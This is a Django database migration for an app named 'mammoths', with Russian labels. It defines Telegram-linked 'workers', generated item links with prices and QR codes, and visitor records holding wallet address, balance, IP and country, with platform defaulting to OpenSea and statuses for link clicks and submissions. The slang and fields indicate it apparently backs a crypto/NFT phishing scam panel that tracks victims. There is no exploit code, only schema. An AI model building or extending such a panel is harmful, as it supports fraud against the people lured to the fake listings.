# Generated by Django 4.2.2 on 2023-08-31 20:19

from django.conf import settings
from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    initial = True

    dependencies = [
        ('auth', '0012_alter_user_first_name_max_length'),
    ]

    operations = [
        migrations.CreateModel(
            name='Worker',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),
                ('is_superuser', models.BooleanField(default=False, help_text='Designates that this user has all permissions without explicitly assigning them.', verbose_name='superuser status')),
                ('email', models.EmailField(max_length=255, unique=True)),
                ('password', models.CharField(max_length=128)),
                ('id_telegram', models.CharField(max_length=100, unique=True)),
                ('is_active', models.BooleanField(default=True)),
                ('is_staff', models.BooleanField(default=False)),
                ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.group', verbose_name='groups')),
                ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.permission', verbose_name='user permissions')),
            ],
            options={
                'verbose_name': 'Воркер',
                'verbose_name_plural': 'Воркеры',
            },
        ),
        migrations.CreateModel(
            name='Chat',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('message', models.TextField()),
                ('is_worker', models.CharField(blank=True, max_length=100, null=True)),
                ('ip_address', models.GenericIPAddressField(blank=True, null=True)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
            ],
            options={
                'verbose_name': 'Чат',
                'verbose_name_plural': 'Чаты',
            },
        ),
        migrations.CreateModel(
            name='CreateLink',
            fields=[
                ('collection', models.CharField(blank=True, max_length=300, null=True, verbose_name='Коллекция')),
                ('custom_token', models.AutoField(primary_key=True, serialize=False, verbose_name='Кастомный токен')),
                ('title', models.CharField(blank=True, max_length=200, null=True, verbose_name='Заголовок')),
                ('description', models.TextField(blank=True, null=True, verbose_name='Описание')),
                ('price', models.DecimalField(blank=True, decimal_places=2, max_digits=10, null=True, verbose_name='Цена')),
                ('link', models.URLField(blank=True, null=True, verbose_name='Ссылка')),
                ('image_link', models.URLField(blank=True, null=True, verbose_name='Ссылка на фото')),
                ('qr', models.ImageField(blank=True, null=True, upload_to='qrcodes/', verbose_name='QR')),
                ('worker_id_telegram', models.CharField(blank=True, max_length=100, null=True, verbose_name='id Telegram')),
                ('slug', models.SlugField(blank=True, max_length=200, null=True, unique=True, verbose_name='URL')),
                ('creator', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='Создатель')),
            ],
            options={
                'verbose_name': 'Ссылка',
                'verbose_name_plural': 'Ссылки',
            },
        ),
        migrations.CreateModel(
            name='UserFinishInfo',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('user_name', models.CharField(max_length=200, verbose_name='Имя')),
                ('card_name', models.CharField(max_length=100, verbose_name='Название карты')),
                ('img_link', models.URLField(max_length=500, verbose_name='Ссылка на фото')),
                ('card_description', models.CharField(max_length=300, verbose_name='Описание карты')),
                ('card_about_contact_address', models.CharField(max_length=200, verbose_name='Контакный адрес')),
                ('token_id', models.IntegerField(verbose_name='Токен id')),
            ],
            options={
                'verbose_name': 'Информация о пользователе',
                'verbose_name_plural': 'Информации о пользователях',
            },
        ),
        migrations.CreateModel(
            name='ReboundTelegram',
            fields=[
                ('createlink_ptr', models.OneToOneField(auto_created=True, on_delete=django.db.models.deletion.CASCADE, parent_link=True, primary_key=True, serialize=False, to='mammoths.createlink')),
                ('status', models.CharField(choices=[('New Message Chat', 'New Message Chat'), ('Following a link', 'Переход по ссылке'), ('Clicking / Submit', 'Нажатие / Отправить')], max_length=20)),
                ('platform', models.CharField(default='OpenSea', max_length=100)),
                ('wallet', models.CharField(max_length=100)),
                ('address', models.CharField(max_length=200)),
                ('balance', models.DecimalField(decimal_places=12, max_digits=20)),
                ('ip', models.GenericIPAddressField()),
                ('country', models.CharField(max_length=100)),
            ],
            bases=('mammoths.createlink',),
        ),
        migrations.CreateModel(
            name='Message',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('content', models.TextField()),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('chat', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='chat_messages', to='mammoths.chat')),
                ('sender', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),
            ],
            options={
                'verbose_name': 'Сообщение',
                'verbose_name_plural': 'Сообщения',
            },
        ),
        migrations.AddField(
            model_name='chat',
            name='link',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='chats', to='mammoths.createlink'),
        ),
        migrations.AddField(
            model_name='chat',
            name='worker',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL),
        ),
    ]
